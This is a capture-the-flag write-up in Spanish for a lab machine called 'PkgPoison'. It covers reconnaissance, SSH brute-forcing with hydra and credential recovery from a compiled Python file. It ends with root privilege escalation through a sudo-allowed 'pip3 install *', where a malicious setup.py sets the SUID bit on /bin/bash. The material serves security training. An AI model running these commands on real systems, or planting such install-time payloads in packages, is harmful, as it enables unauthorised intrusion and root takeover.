# PkgPoison - Writeup

## Resumen
Máquina en la cual tendremos que usar fuerza bruta para obtener la contraseña del usuario encontrado, buscar información para moverse entre usuarios y finalmente crear un script malicioso para obtener acceso a la máquina.
<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/deb154b4-06b1-455e-a72c-972a16954c61" />

## Paso N1: Reconocimiento 
Empezamos escaneando los puertos TCP con sus respectivos servicios y versiones
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
```
y vemos que están los puertos 22 y 80 correspondientes a ssh y http respectivamente. 
<img width="668" height="438" alt="image" src="https://github.com/user-attachments/assets/abe66963-21fe-444f-9163-b8b7a0c1bd50" />

## Paso N2: Descubrimiento de subdirectorios
En la página inicial no encontraremos gran cosa, por lo que empezamos la búsqueda de subdirectorios en busca de información.
```
gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html
```
<img width="667" height="482" alt="image" src="https://github.com/user-attachments/assets/1f81b6bc-2918-4829-9b73-54d21348960f" />

encontraremos el subdirectorio ```/notes/``` el cual nos lleva a note.txt y contiene contenido interesante, nos dice que las credenciales antiguas son ```dev:developer123```, por lo que ya tenemos el usuario.

## Paso N3: Acceso a usuario dev
Como ya tenemos el usuario, haremos fuerza bruta para encontrar la contraseña de esta forma:
```
hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/
```
<img width="665" height="399" alt="image" src="https://github.com/user-attachments/assets/9d87cd3e-0379-46d9-a5f9-ea44918271f8" />

Encontramos que las credenciales correctas son ```dev:computer``` por lo que ahora logramos entrar al servidor ssh con las respectivas credenciales ```ssh dev@172.17.0.2```.

## Paso N4: Accediendo a usuario admin 
En el directorio home, vemos que hay un subdirectorio llamado ```admin``` lo que nos dice que hay un usuario con dicho nombre. 
Explorando un poco el sistema, veremos que en ```/opt/scripts/__pycache__``` hay un archivo llamado ```secret.cpython-38.pyc```, el cual parece tener contenido pero está compilado, por lo que usamos ```strings``` para pasarlo a un formato humanamente legible.
```
strings secret.cpython-38.pyc
```
<img width="600" height="214" alt="image" src="https://github.com/user-attachments/assets/be7b1b3b-dc86-4127-8d79-02965c24dfcb" />

y obtenemos las credenciales ```admin:p@$$w0r8321```, por lo que ahora podemos acceder a usuario ```admin```

## Paso N5: Escalando privilegios
Una vez dentro del usuario ```admin``` ejecutamos ```sudo -l``` y nos devuelve:
<img width="670" height="155" alt="image" src="https://github.com/user-attachments/assets/8c7ea224-f593-4647-91f6-a3594c2a1b12" />

```(ALL) NOPASSWD: /usr/bin/pip3 install *``` Nos dice que el usuario admin puede ejecutar pip3 install con cualquier argumento, como cualquier usuario sin necesidad de contraseña, por lo que podemos aprovecharnos para crear un script malicioso y ganar acceso root.

```
echo 'import os; os.system("chmod +s /bin/bash"); import setuptools; setuptools.setup(name="exploit", version="1.0")' > setup.py
```
Creamos el archivo malicioso ```setup.py```

```
sudo /usr/bin/pip3 install .
```
le decimos a pip que instale el paquete que está definido en el directorio actual, en este caso ```setup.py```

```
bash -p
```
Obtenemos la shell de root

<img width="667" height="279" alt="image" src="https://github.com/user-attachments/assets/26ffccfd-2ed3-49a9-941b-400eb2312a86" />
